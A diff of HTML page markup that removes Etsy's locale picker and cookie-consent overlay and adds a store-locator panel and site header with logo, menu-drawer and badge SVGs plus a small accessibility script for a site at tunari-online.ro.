-                                <option value="MQ" >Martinique</option>
-                                <option value="MR" >Mauritania</option>
-                                <option value="MU" >Mauritius</option>
-                                <option value="YT" >Mayotte</option>
-                                <option value="MX" >Mexico</option>
-                                <option value="FM" >Micronesia, Federated States of</option>
-                                <option value="MD" >Moldova</option>
-                                <option value="MC" >Monaco</option>
-                                <option value="MN" >Mongolia</option>
-                                <option value="ME" >Montenegro</option>
-                                <option value="MS" >Montserrat</option>
-                                <option value="MA" >Morocco</option>
-                                <option value="MZ" >Mozambique</option>
-                                <option value="MM" >Myanmar (Burma)</option>
-                                <option value="NA" >Namibia</option>
-                                <option value="NR" >Nauru</option>
-                                <option value="NP" >Nepal</option>
-                                <option value="AN" >Netherlands Antilles</option>
-                                <option value="NC" >New Caledonia</option>
-                                <option value="NZ" >New Zealand</option>
-                                <option value="NI" >Nicaragua</option>
-                                <option value="NE" >Niger</option>
-                                <option value="NG" >Nigeria</option>
-                                <option value="NU" >Niue</option>
-                                <option value="NF" >Norfolk Island</option>
-                                <option value="MP" >Northern Mariana Islands</option>
-                                <option value="NO" >Norway</option>
-                                <option value="OM" >Oman</option>
-                                <option value="PK" >Pakistan</option>
-                                <option value="PW" >Palau</option>
-                                <option value="PS" >Palestinian Territory, Occupied</option>
-                                <option value="PA" >Panama</option>
-                                <option value="PG" >Papua New Guinea</option>
-                                <option value="PY" >Paraguay</option>
-                                <option value="PE" >Peru</option>
-                                <option value="PH" >Philippines</option>
-                                <option value="PL" >Poland</option>
-                                <option value="PT" >Portugal</option>
-                                <option value="PR" >Puerto Rico</option>
-                                <option value="QA" >Qatar</option>
-                                <option value="RE" >Reunion</option>
-                                <option value="RO" >Romania</option>
-                                <option value="RW" >Rwanda</option>
-                                <option value="SH" >Saint Helena</option>
-                                <option value="KN" >Saint Kitts and Nevis</option>
-                                <option value="LC" >Saint Lucia</option>
-                                <option value="MF" >Saint Martin (French part)</option>
-                                <option value="PM" >Saint Pierre and Miquelon</option>
-                                <option value="VC" >Saint Vincent and the Grenadines</option>
-                                <option value="WS" >Samoa</option>
-                                <option value="SM" >San Marino</option>
-                                <option value="ST" >Sao Tome and Principe</option>
-                                <option value="SA" >Saudi Arabia</option>
-                                <option value="SN" >Senegal</option>
-                                <option value="RS" >Serbia</option>
-                                <option value="SC" >Seychelles</option>
-                                <option value="SL" >Sierra Leone</option>
-                                <option value="SG" >Singapore</option>
-                                <option value="SX" >Sint Maarten (Dutch part)</option>
-                                <option value="SK" >Slovakia</option>
-                                <option value="SI" >Slovenia</option>
-                                <option value="SB" >Solomon Islands</option>
-                                <option value="SO" >Somalia</option>
-                                <option value="ZA" >South Africa</option>
-                                <option value="GS" >South Georgia and the South Sandwich Islands</option>
-                                <option value="KR" >South Korea</option>
-                                <option value="SS" >South Sudan</option>
-                                <option value="ES" >Spain</option>
-                                <option value="LK" >Sri Lanka</option>
-                                <option value="SD" >Sudan</option>
-                                <option value="SR" >Suriname</option>
-                                <option value="SJ" >Svalbard and Jan Mayen</option>
-                                <option value="SZ" >Swaziland</option>
-                                <option value="SE" >Sweden</option>
-                                <option value="CH" >Switzerland</option>
-                                <option value="TW" >Taiwan</option>
-                                <option value="TJ" >Tajikistan</option>
-                                <option value="TZ" >Tanzania</option>
-                                <option value="TH" >Thailand</option>
-                                <option value="NL" >The Netherlands</option>
-                                <option value="TL" >Timor-Leste</option>
-                                <option value="TG" >Togo</option>
-                                <option value="TK" >Tokelau</option>
-                                <option value="TO" >Tonga</option>
-                                <option value="TT" >Trinidad</option>
-                                <option value="TN" >Tunisia</option>
-                                <option value="TR" >Türkiye</option>
-                                <option value="TM" >Turkmenistan</option>
-                                <option value="TC" >Turks and Caicos Islands</option>
-                                <option value="TV" >Tuvalu</option>
-                                <option value="UG" >Uganda</option>
-                                <option value="UA" >Ukraine</option>
-                                <option value="AE" >United Arab Emirates</option>
-                                <option value="GB" >United Kingdom</option>
-                                <option value="US" >United States</option>
-                                <option value="UM" >United States Minor Outlying Islands</option>
-                                <option value="UY" >Uruguay</option>
-                                <option value="VI" >U.S. Virgin Islands</option>
-                                <option value="UZ" >Uzbekistan</option>
-                                <option value="VU" >Vanuatu</option>
-                                <option value="VE" >Venezuela</option>
-                                <option value="VN" >Vietnam</option>
-                                <option value="WF" >Wallis and Futuna</option>
-                                <option value="EH" >Western Sahara</option>
-                                <option value="YE" >Yemen</option>
-                                <option value="CD" >Zaire (Democratic Republic of Congo)</option>
-                                <option value="ZM" >Zambia</option>
-                                <option value="ZW" >Zimbabwe</option>
-                            </optgroup>
-                        </select>
-                    </div>
-                </div>
-                <div id="locale_picker_language_code" class="locale_picker_section wt-pb-xs-3 wt-text-left-xs wt-b-xs-none">
-
-                    <label class="wt-label wt-pb-xs-1" for="locale-overlay-select-language_code">Language</label>
-                    <div class="wt-select wt-text-body-01">
-                        <select id="locale-overlay-select-language_code" name="language_code" class="wt-select__element">
-                                <option value="de" >Deutsch</option>
-                                <option value="en-GB" selected="selected">English (UK)</option>
-                                <option value="en-IN" >English (IN)</option>
-                                <option value="en-US" >English (US)</option>
-                                <option value="es" >Español</option>
-                                <option value="fr" >Français</option>
-                                <option value="it" >Italiano</option>
-                                <option value="ja" >日本語</option>
-                                <option value="nl" >Nederlands</option>
-                                <option value="pl" >Polski</option>
-                                <option value="pt" >Português</option>
-                                <option value="ru" >Русский</option>
-                        </select>
-                    </div>
-                </div>
-                <div id="locale_picker_currency_code" class="locale_picker_section wt-pb-xs-3 wt-text-left-xs wt-b-xs-none">
-
-                    <label class="wt-label wt-pb-xs-1" for="locale-overlay-select-currency_code">Currency</label>
-                    <div class="wt-select wt-text-body-01">
-                        <select id="locale-overlay-select-currency_code" name="currency_code" class="wt-select__element">
-                                <option value="USD" >$ United States Dollar (USD)</option>
-                                <option value="CAD" >$ Canadian Dollar (CAD)</option>
-                                <option value="EUR" >€ Euro (EUR)</option>
-                                <option value="GBP" >£ British Pound (GBP)</option>
-                                <option value="AUD" >$ Australian Dollar (AUD)</option>
-                                <option value="JPY" >¥ Japanese Yen (JPY)</option>
-                                <option value="CNY" >¥ Chinese Yuan (CNY)</option>
-                                <option value="CZK" >Kč Czech Koruna (CZK)</option>
-                                <option value="DKK" >kr Danish Krone (DKK)</option>
-                                <option value="HKD" >$ Hong Kong Dollar (HKD)</option>
-                                <option value="HUF" >Ft Hungarian Forint (HUF)</option>
-                                <option value="INR" >₹ Indian Rupee (INR)</option>
-                                <option value="IDR" selected="selected">Rp Indonesian Rupiah (IDR)</option>
-                                <option value="ILS" >₪ Israeli Shekel (ILS)</option>
-                                <option value="MYR" >RM Malaysian Ringgit (MYR)</option>
-                                <option value="MXN" >$ Mexican Peso (MXN)</option>
-                                <option value="MAD" >DH Moroccan Dirham (MAD)</option>
-                                <option value="NZD" >$ New Zealand Dollar (NZD)</option>
-                                <option value="NOK" >kr Norwegian Krone (NOK)</option>
-                                <option value="PHP" >₱ Philippine Peso (PHP)</option>
-                                <option value="SGD" >$ Singapore Dollar (SGD)</option>
-                                <option value="VND" >₫ Vietnamese Dong (VND)</option>
-                                <option value="ZAR" >R South African Rand (ZAR)</option>
-                                <option value="SEK" >kr Swedish Krona (SEK)</option>
-                                <option value="CHF" >Swiss Franc (CHF)</option>
-                                <option value="THB" >฿ Thai Baht (THB)</option>
-                                <option value="TWD" >NT$ Taiwan New Dollar (TWD)</option>
-                                <option value="TRY" >₺ Turkish Lira (TRY)</option>
-                                <option value="PLN" >zł Polish Zloty (PLN)</option>
-                                <option value="BRL" >R$ Brazilian Real (BRL)</option>
-                        </select>
-                    </div>
-                </div>
-                -->
-                </div>
-            <div class="wt-overlay__footer wt-justify-content-flex-end">
-                <div class="wt-overlay__footer__action">
-                    <a  type="button" data-wt-overlay-close
-                        
-                        class="wt-btn wt-btn--outline wt-mb-xs-1 wt-mb-md-0 wt-mr-md-1" name="cancel">
-
-                        Cancel
-                        <div class="wt-spinner wt-spinner--01" role="alert" aria-live="assertive">
-                            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle fill="transparent" cx="12" cy="12" r="10"/></svg></span>
-                            Loading
-                        </div>
-
-                    </a>
-                    <button class="wt-btn wt-btn--filled" action-type="primary" type="submit" name="save" id="locale-overlay-save">
-                        Save
-                        <div class="wt-spinner wt-spinner--01" role="alert" aria-live="assertive">
-                            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle fill="transparent" cx="12" cy="12" r="10"/></svg></span>
-                            Loading
-                        </div>
+                        <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                            class="icon icon-close" fill="none" viewBox="0 0 18 17" width="18" height="17">
+                            <path
+                                d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
+                                fill="currentColor">
+                        </svg>
                     </button>
-                </div>
-            </div>
-        </form>
-
-    </div>
-</div>
-
-    </footer>
-</div>
-
-        <div
-        data-gdpr-consent-prompt
->
-    <div
-    id="gdpr-privacy-settings"
-    class="wt-overlay third-party-settings wt-text-left-xs"
-    aria-labelledby="gdpr-full-settings-overlay-title"
-    aria-hidden="true"
-    role="dialog"
-    data-gdpr-settings-overlay
-    data-wt-overlay
->
-    <div class="wt-overlay__modal gdpr-overlay-view" data-overlay-modal>
-        <div class="wt-overlay__header gdpr-overlay-header">
-            <h3 class="wt-text-heading" id="gdpr-full-settings-overlay-title">Privacy Settings</h3>
-        </div>
-
-
-        <div class="gdpr-overlay-body wt-pb-xl-2 wt-pb-lg-2 wt-pb-md-2 wt-pb-sm-2 wt-pb-xs-2">
-            <div>
-    <div data-section="intro">
-        <p>Etsy uses cookies and similar technologies to give you a better experience, enabling things like:</p>
-<ul><li>basic site functions</li>
-<li>ensuring secure, safe transactions</li>
-<li>secure account login</li>
-<li>remembering account, browser, and regional preferences</li>
-<li>remembering privacy and security settings</li>
-<li>analysing site traffic and usage</li>
-<li>personalised search, content, and recommendations</li>
-<li>helping sellers understand their audience</li>
-<li>showing relevant, targeted ads on and off Etsy</li>
-</ul><p>Detailed information can be found in Etsy’s <a href="/legal/cookies-and-tracking-technologies">Cookies &amp; Similar Technologies Policy</a> and our <a href="/legal/privacy">Privacy Policy</a>.</p>
-    </div>
-
-    <div class="wt-pt-xl-6 wt-display-flex-xl wt-pt-lg-6 wt-display-flex-lg wt-pt-md-6 wt-display-flex-md wt-pt-sm-6 wt-display-flex-sm wt-pt-xs-6 wt-display-flex-xs">
-        <div class="wt-flex-xl-5 wt-flex-lg-5 wt-flex-md-5 wt-flex-sm-5 wt-flex-xs-5">
-            <h2>Required Cookies &amp; Technologies</h2>
-<p>Some of the technologies we use are necessary for critical functions like security and site integrity, account authentication, security and privacy preferences, internal site usage and maintenance data, and to make the site work correctly for browsing and transactions.</p>
-        </div>
-        <div class="wt-flex-xl-1 wt-flex-lg-1 wt-flex-md-1 wt-flex-sm-1 wt-flex-xs-1">
-            <div class="wt-display-flex-xl wt-display-flex-lg wt-display-flex-md wt-display-flex-sm wt-display-flex-xs wt-justify-content-flex-end">
-                <span class="wt-text-caption">Always on</span>
-            </div>
-        </div>
-    </div>
-
-    <div class="wt-text-caption wt-pt-xl-6 wt-display-flex-xl wt-pt-lg-6 wt-display-flex-lg wt-pt-lg-6 wt-display-flex-lg wt-pt-md-6 wt-display-flex-md wt-pt-sm-6 wt-display-flex-sm wt-pt-xs-6 wt-display-flex-xs" data-section="third_party_consent">
-        <div class="wt-flex-xl-5 wt-flex-lg-5 wt-flex-md-5 wt-flex-sm-5 wt-flex-xs-5">
-            <h2 class="wt-text-title-01 wt-mb-xs-4 wt-break-word">Personalised Advertising</h2>
-<p class="wt-text-caption wt-mb-xs-2">To enable personalised advertising (like interest-based ads), we may share your data with our marketing and advertising partners using cookies and other technologies. Those partners may have their own information they’ve collected about you. Turning off the personalised advertising setting won’t stop you from seeing Etsy ads, but it may make the ads you see less relevant or more repetitive.</p>
-<p class="wt-text-caption wt-mb-xs-2"> Personalised advertising may be considered a “sale” or “sharing” of information under California and other state privacy laws, and you may have a right to opt out. Turning off personalised advertising allows you to exercise your right to opt out. Learn more in our <a class="wt-text-link" href="https://www.etsy.com/legal/privacy/">Privacy Policy</a>, <a class="wt-text-link" href="https://help.etsy.com/hc/en-us/articles/360042433614-How-to-Opt-out-of-Personalized-Advertising">Help Centre</a>, and <a class="wt-text-link" href="https://www.etsy.com/legal/cookies">Cookies & Similar Technologies Policy</a>.</p>
-        </div>
-        <div class="wt-flex-xl-1 wt-flex-lg-1 wt-flex-md-1 wt-flex-sm-1 wt-flex-xs-1">
-            <div class="wt-display-flex-xl wt-display-flex-lg wt-display-flex-md wt-display-flex-sm wt-display-flex-xs wt-justify-content-flex-end">
-                <label for="third_party_consent" class="wt-text-caption wt-pt-xl-1 wt-pr-xl-2 wt-pt-lg-1 wt-pr-lg-2 wt-pt-md-1 wt-pr-md-2 wt-pt-sm-1 wt-pr-sm-2 wt-pt-xs-1 wt-pr-xs-2 wt-nudge-t-3" aria-hidden="true" data-gdpr-toggle-label>
-                        On
-                </label>
-                <input
-                        class="wt-switch wt-switch--small"
-                        type="checkbox"
-                        name="third_party_consent"
-                        id="third_party_consent"
-                        checked
-                        
-                        data-gdpr-toggle
-                        data-checked-label="On"
-                        data-unchecked-label="Off">
-                <label class="wt-switch__toggle" for="third_party_consent" aria-hidden="true"></label>
-            </div>
-        </div>
-    </div>
-</div>
-        </div>
-
-        <div class="wt-overlay__footer wt-align-items-center">
-            <div class="wt-overlay__footer__cancel">
-            </div>
-            <div class="wt-overlay__footer__action">
-                <div class="wt-display-flex-xl wt-flex-direction-row-xl wt-display-flex-lg wt-flex-direction-row-lg wt-display-flex-md wt-flex-direction-row-md wt-display-flex-sm wt-flex-direction-column-sm wt-display-flex-xs wt-flex-direction-column-xs">
-                    <div class="wt-pr-xl-7 wt-pt-xl-2 wt-pr-lg-7 wt-pt-lg-2 wt-pr-md-7 wt-pt-md-2 wt-pb-sm-4 wt-pb-xs-2 wt-horizontal-center wt-display-none" data-saving-indicator>
-                        <div class="wt-spinner wt-spinner--01 wt-display-inline-block wt-vertical-align-middle">
-                            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle fill="transparent" cx="12" cy="12" r="10"/></svg></span>
+                    <div class="my-store-locator__details-header">
+                        <h2 class="my-store-locator__details-title" id="MyStoreDetailsMobileHeading"></h2>
+                        <span class="js-my-store-locator-distance my-store-locator__details-distance hidden">
+                            <i class="fa fa-spinner fa-spin"></i>
+                        </span>
+                    </div>
+                    <div class="js-my-store-locator-location my-store-locator__details-location"></div>
+                    <div class="my-store-locator-content">
+                        <div class="js-my-store-locator-address my-store-locator__details-info hidden">
+                            Address: <a href="#"></a>
                         </div>
+                        <div class="js-my-store-locator-telephone my-store-locator__details-info hidden">
+                            Telephone: <a href="#"></a>
+                        </div>
+                        <div class="js-my-store-locator-email my-store-locator__details-info hidden">
+                            Email: <a href="#"></a>
+                        </div>
+                        <div class="js-my-store-locator-hours my-store-locator__details-info hidden">
+                            Hours: <span></span>
+                        </div>
+                        <div class="js-my-store-locator-services hidden"></div>
                     </div>
-                    <div class="wt-pr-xl-7 wt-pt-xl-2 wt-pr-lg-7 wt-pt-lg-2 wt-pr-md-7 wt-pt-md-2 wt-pb-sm-4 wt-pb-xs-2 wt-horizontal-center wt-display-none" data-saved-indicator>
-                        <span class="etsy-icon wt-icon--smaller-xs"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M9.057,20.471L2.293,13.707a1,1,0,0,1,1.414-1.414l5.236,5.236,11.3-13.18a1,1,0,1,1,1.518,1.3Z"/></svg></span>
-                        <span class="wt-display-inline-block wt-vertical-align-middle wt-text-body-01 wt-pl-xs-1">Saved</span>
-                    </div>
-                    <div>
-                        <button data-wt-overlay-close class="wt-btn wt-btn--primary wt-pl-xs-8 wt-pr-xs-8 wt-pl-sm-10 wt-pr-sm-10 wt-pl-md-3 wt-pr-md-3 wt-pl-lg-3 wt-pr-lg-3 wt-pl-xl-3 wt-pr-xl-3 wt-pl-tv-3 wt-pr-tv-3">
-                            <p class="wt-pl-xs-10 wt-pr-xs-10 wt-pl-sm-10 wt-pr-sm-10 wt-pl-md-0 wt-pr-md-0 wt-pl-lg-0 wt-pr-lg-0 wt-pl-xl-0 wt-pr-xl-0 wt-pl-tv-0 wt-pr-tv-0">Done</p>
+                    <div class="my-store-locator__details-footer"><a
+                            class="my-store-locator__details-btn--secondary button button--secondary button--full-width"
+                            href="/">
+                            View store map
+                        </a><button
+                            class="js-my-store-locator-drawer-btn my-store-locator__details-btn button button--full-width"
+                            aria-haspopup="dialog">
+                            Select another store
                         </button>
                     </div>
                 </div>
+            </my-store-locator-mobile>
+            <header
+                class="header header--middle-left header--mobile-center page-width header--has-menu header--has-social header--has-account">
+
+
+                <lazyload-section class="header-drawer-lazyload" data-render-on-load="true"
+                    data-selector=".js-header-drawer"
+                    data-callback="if (window.initHeaderDrawerAria) window.initHeaderDrawerAria()">
+                    <header-drawer data-breakpoint="tablet">
+                        <details id="Details-menu-drawer-container" class="menu-drawer-container">
+                            <summary class="header__icon header__icon--menu header__icon--summary link focus-inset"
+                                aria-label="Menu">
+                                <span>
+
+
+
+                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                                        class="icon icon-hamburger" fill="none" viewBox="0 0 18 16" width="18"
+                                        height="16">
+                                        <path
+                                            d="M1 .5a.5.5 0 100 1h15.71a.5.5 0 000-1H1zM.5 8a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1A.5.5 0 01.5 8zm0 7a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1a.5.5 0 01-.5-.5z"
+                                            fill="currentColor">
+                                    </svg>
+
+
+
+
+                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                                        class="icon icon-close" fill="none" viewBox="0 0 18 17" width="18" height="17">
+                                        <path
+                                            d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
+                                            fill="currentColor">
+                                    </svg>
+
+                                </span>
+                            </summary>
+
+                            <div id="menu-drawer" class="gradient menu-drawer motion-reduce color-background-1"
+                                tabindex="-1" style="background-color:#ffffff"></div>
+                        </details>
+                    </header-drawer>
+                </lazyload-section>
+                <script>
+                    window.initHeaderDrawerAria = function () {
+                        document.querySelectorAll('.js-header-drawer [id^="Details-"] summary').forEach((summary) => {
+                            summary.setAttribute('role', 'button');
+                            summary.setAttribute('aria-expanded', summary.parentNode.hasAttribute('open'));
+
+                            if (summary.nextElementSibling.getAttribute('id')) {
+                                summary.setAttribute('aria-controls', summary.nextElementSibling.id);
+                            }
+
+                            summary.addEventListener('click', (event) => {
+                                event.currentTarget.setAttribute('aria-expanded', !event.currentTarget.closest('details').hasAttribute('open'));
+                            });
+
+                            if (summary.closest('header-drawer, menu-drawer')) return;
+                            summary.parentElement.addEventListener('keyup', onKeyUpEscape);
+                        });
+                    };
+                </script>
+
+
+
+
+
+                <div class="header__heading">
+                    <div class="brand--logo">
+                        <a href="https://tunari-online.ro/"
+                            class="header__heading-link link link--text focus-inset" aria-label="Home">
+                            <div class="ratio" style="--ratio-percent: 25.875000000000004%">
+                                <img src="https://ik.imagekit.io/ck1mayks8/logo-slot.webp?updatedAt=1770202951934"
+                                    loading="lazy" class="header__heading-logo company_logo ratio" width="800"
+                                    height="207" alt="logo">
+                            </div>
+                        </a>
+                    </div>
+                    <div class="apple_logo">
+                        <a href="https://tunari-online.ro/"
+                            class="header__heading-link link link--text focus-inset" aria-label="Home"><svg width="78"
+                                height="36" viewbox="0 0 78 36" fill="none" xmlns="http://www.w3.org/2000/svg"
+                                style="background-color: #fffb00;">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M67.3956 0.551707C68.5859 0.553638 69.3535 0.556397 69.9332 0.561638C70.5052 0.566603 70.8971 0.573776 71.2123 0.583982C71.8133 0.603292 72.2433 0.638325 72.6165 0.691289C73.243 0.78039 73.7505 0.930454 74.2151 1.15555C74.6777 1.37927 75.0969 1.67912 75.4562 2.04132C75.8154 2.40351 76.1117 2.82557 76.333 3.29093C76.5553 3.75878 76.7043 4.26966 76.7927 4.90192C76.8453 5.27818 76.8806 5.71293 76.9004 6.31981C76.9105 6.63814 76.9179 7.03344 76.9228 7.6108C76.928 8.19561 76.931 8.96966 76.9329 10.1691V25.8318C76.931 27.0312 76.928 27.8052 76.9228 28.39C76.9176 28.9671 76.9105 29.3627 76.9004 29.681C76.8806 30.2882 76.8456 30.7226 76.7927 31.0989C76.7043 31.7309 76.5553 32.242 76.333 32.7099C76.1117 33.1753 75.8152 33.5976 75.4562 33.9595C75.0969 34.3217 74.6777 34.6213 74.2151 34.8453C73.7505 35.0701 73.243 35.2204 72.6165 35.3095C72.2435 35.3625 71.8136 35.3975 71.2123 35.4168C70.8971 35.4271 70.5052 35.4342 69.9332 35.4392C69.3535 35.4442 68.5859 35.4472 67.3956 35.4491H10.8639C9.67355 35.4472 8.90599 35.4444 8.32628 35.4392C7.75425 35.4342 7.36239 35.4271 7.04721 35.4168C6.44614 35.3975 6.01622 35.3625 5.64298 35.3095C5.01645 35.2204 4.50904 35.0704 4.04434 34.8453C3.58184 34.6216 3.1626 34.3217 2.80332 33.9595C2.44405 33.5973 2.14777 33.1753 1.92651 32.7099C1.70415 32.242 1.55519 31.7312 1.46674 31.0989C1.41416 30.7226 1.37884 30.2879 1.3594 29.681C1.34927 29.3627 1.34187 28.9674 1.33694 28.39C1.33174 27.8052 1.32873 27.0312 1.32681 25.8318V10.1688C1.32873 8.96938 1.33174 8.19533 1.33694 7.61053C1.34215 7.03344 1.34927 6.63787 1.3594 6.31953C1.37911 5.71238 1.41416 5.27791 1.46674 4.90164C1.55519 4.26966 1.70415 3.75851 1.92651 3.29066C2.14777 2.82529 2.44433 2.40296 2.80332 2.04104C3.16232 1.67912 3.58184 1.37927 4.04434 1.15527C4.50904 0.930454 5.01645 0.780114 5.64298 0.691013C6.01595 0.638049 6.44587 0.603016 7.04721 0.583706C7.36239 0.5735 7.75425 0.566327 8.32628 0.561362C8.90599 0.556397 9.67355 0.553362 10.8639 0.551431H67.3956V0.551707ZM67.3964 0H67.3959H67.3953H10.8639C9.67081 0.00193098 8.90216 0.00496536 8.32136 0.00993073C7.75589 0.0148961 7.35746 0.0217924 7.02941 0.0325507C6.42916 0.0518605 5.97788 0.086618 5.56658 0.144823C4.89131 0.24082 4.33214 0.40385 3.80693 0.657911C3.28856 0.908938 2.8203 1.243 2.41585 1.65098C2.01167 2.05842 1.68088 2.52985 1.43251 3.05232C1.18113 3.58113 1.01957 4.14415 0.924276 4.8244C0.865949 5.24177 0.831172 5.6972 0.81173 6.3016C0.80105 6.63704 0.793931 7.03896 0.789001 7.60556C0.784072 8.18127 0.780786 8.94759 0.77887 10.1677V25.8312C0.780786 27.0521 0.784072 27.8185 0.789001 28.3944C0.793931 28.9608 0.80105 29.363 0.81173 29.6981C0.831172 30.3025 0.865949 30.758 0.924276 31.1753C1.01957 31.8556 1.18086 32.4189 1.43251 32.9477C1.68088 33.4701 2.01167 33.9416 2.41585 34.349C2.8203 34.757 3.28856 35.0911 3.80693 35.3421C4.33187 35.5964 4.89104 35.7595 5.56631 35.8552C5.97788 35.9137 6.42916 35.9481 7.02941 35.9674C7.35719 35.9782 7.75561 35.9851 8.32108 35.9901C8.90161 35.995 9.67054 35.9981 10.8628 36H67.3953C68.5884 35.9981 69.3571 35.9953 69.9379 35.9901C70.5033 35.9851 70.9018 35.9782 71.2298 35.9674C71.83 35.9481 72.2813 35.9134 72.6926 35.8552C73.3679 35.7592 73.9271 35.5961 74.4523 35.3421C74.9707 35.0911 75.4389 34.757 75.8434 34.349C76.2475 33.9416 76.5783 33.4701 76.8267 32.9477C77.0781 32.4189 77.2396 31.8559 77.3349 31.1756C77.3933 30.7585 77.428 30.3031 77.4475 29.6984C77.4582 29.363 77.4653 28.9608 77.4702 28.3944C77.4754 27.8182 77.4784 27.0519 77.4803 25.8323V10.1688C77.4784 8.94814 77.4751 8.18182 77.4702 7.60556C77.4653 7.03923 77.4582 6.63704 77.4475 6.30188C77.428 5.6972 77.3933 5.24177 77.3349 4.82468C77.2396 4.14442 77.0784 3.58113 76.8267 3.05232C76.5783 2.52985 76.2475 2.05842 75.8434 1.65098C75.4389 1.243 74.9707 0.908938 74.4523 0.657911C73.9273 0.40385 73.3682 0.240544 72.6929 0.144823C72.2813 0.0863422 71.83 0.0518605 71.2298 0.0325507C70.9018 0.0220683 70.5033 0.0148961 69.9381 0.00993073C69.3573 0.00496536 68.5887 0.00193098 67.3964 0ZM22.5344 11.7168C21.5471 11.6432 20.6516 12.0003 19.9308 12.2877C19.4756 12.4692 19.09 12.623 18.7949 12.623C18.4598 12.623 18.0462 12.4578 17.5821 12.2725C16.9748 12.03 16.2811 11.753 15.5645 11.7667C13.9039 11.7913 12.3737 12.7399 11.5177 14.2375C9.79313 17.2529 11.0774 21.7215 12.7574 24.1683C13.5792 25.3638 14.5592 26.7114 15.8462 26.6623C16.4215 26.6395 16.8308 26.4638 17.254 26.2821C17.7424 26.0725 18.2494 25.8548 19.0517 25.8548C19.8172 25.8548 20.3017 26.066 20.7676 26.2691C21.2127 26.4632 21.6409 26.6499 22.2811 26.638C23.6146 26.6132 24.4597 25.4176 25.2754 24.2152C26.1766 22.8902 26.5709 21.6054 26.6247 21.4299L26.6301 21.4125C26.6005 21.4012 24.0306 20.4078 24.0048 17.425C23.982 14.9773 25.9504 13.7774 26.1114 13.6792L26.1186 13.6748C24.9578 11.9537 23.1658 11.764 22.5344 11.7168ZM22.5559 6.95508C22.6827 8.1087 22.2224 9.26866 21.5384 10.1015C20.8549 10.9348 19.7349 11.582 18.6374 11.4962C18.4865 10.3663 19.0421 9.18536 19.6744 8.448C20.3806 7.61575 21.5715 6.99453 22.5559 6.95508Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M32.4756 10.1289H34.8561C36.1108 10.1289 36.9797 10.9774 36.9797 12.2411V12.2502C36.9797 13.5095 36.1108 14.3715 34.8561 14.3715H33.4686V16.5731H32.4756V10.1289ZM33.4686 10.9727V13.5318H34.608C35.4725 13.5318 35.9689 13.0629 35.9689 12.2546V12.2458C35.9689 11.4417 35.4728 10.973 34.608 10.973H33.4686V10.9727Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M37.8961 11.8765H38.8537V12.6803H38.8758C39.0264 12.1311 39.4167 11.7871 39.9487 11.7871C40.0859 11.7871 40.2056 11.8095 40.2812 11.823V12.7206C40.2059 12.6894 40.0372 12.6671 39.8512 12.6671C39.2348 12.6671 38.8537 13.0737 38.8537 13.7746V16.5748H37.8961V11.8765Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M40.7574 14.2433V14.2389C40.7574 12.7697 41.5997 11.7871 42.9075 11.7871C44.2154 11.7871 45.0177 12.7341 45.0177 14.1451V14.4712H41.715C41.7325 15.36 42.2158 15.878 42.9782 15.878C43.5456 15.878 43.9224 15.5831 44.0423 15.2303L44.0557 15.1947H44.9643L44.9555 15.2438C44.8049 15.9897 44.0867 16.6686 42.956 16.6686C41.5863 16.6683 40.7574 15.726 40.7574 14.2433ZM41.7279 13.7879H44.0689C43.9889 12.9752 43.5368 12.5777 42.9116 12.5777C42.2911 12.5774 41.8122 13.0017 41.7279 13.7879Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M45.9835 11.8765H46.9411V12.6045H46.9633C47.1629 12.1132 47.6369 11.7871 48.2487 11.7871C48.8916 11.7871 49.3613 12.122 49.5477 12.7118H49.5699C49.8093 12.1402 50.3588 11.7871 51.024 11.7871C51.946 11.7871 52.549 12.4034 52.549 13.3457V16.5745H51.587V13.5779C51.587 12.9661 51.263 12.6133 50.6957 12.6133C50.1283 12.6133 49.7337 13.042 49.7337 13.6362V16.5748H48.7936V13.5065C48.7936 12.9617 48.4524 12.6133 47.9113 12.6133C47.3439 12.6133 46.9406 13.0643 46.9406 13.6717V16.5745H45.983V11.8765H45.9835Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M53.6573 10.5993C53.6573 10.2912 53.9054 10.041 54.2156 10.041C54.5305 10.041 54.7743 10.2912 54.7743 10.5993C54.7743 10.9031 54.5305 11.153 54.2156 11.153C53.9054 11.153 53.6573 10.9031 53.6573 10.5993ZM53.737 11.8765H54.6946V16.5746H53.737V11.8765Z"
+                                    fill="#121212"></path>
+                                <path
+                                    d="M55.8882 14.9207V11.875H56.8458V14.7331C56.8458 15.4432 57.1739 15.8363 57.8388 15.8363C58.5127 15.8363 58.9472 15.3494 58.9472 14.6173V11.8753H59.9092V16.5733H58.9472V15.8677H58.9251C58.6811 16.3411 58.2068 16.6671 57.4976 16.6671C56.4734 16.6669 55.8882 16.0015 55.8882 14.9207Z"
+                                    fill="#121212"></path>
+                                <path
